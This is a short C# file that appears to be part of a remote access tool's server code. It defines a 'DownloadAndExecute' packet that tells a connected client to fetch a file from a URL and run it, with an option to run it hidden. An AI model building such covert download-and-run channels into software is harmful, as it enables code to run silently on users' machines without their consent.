using ProtoBuf;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DownloadAndExecute : IPacket
    {
        [ProtoMember(1)]
        public string URL { get; set; }

        [ProtoMember(2)]
        public bool RunHidden { get; set; }

        public DownloadAndExecute()
        {
        }

        public DownloadAndExecute(string url, bool runhidden)
        {
            this.URL = url;
            this.RunHidden = runhidden;
        }

        public void Execute(Client client)
        {
            client.Send<DownloadAndExecute>(this);
        }
    }
}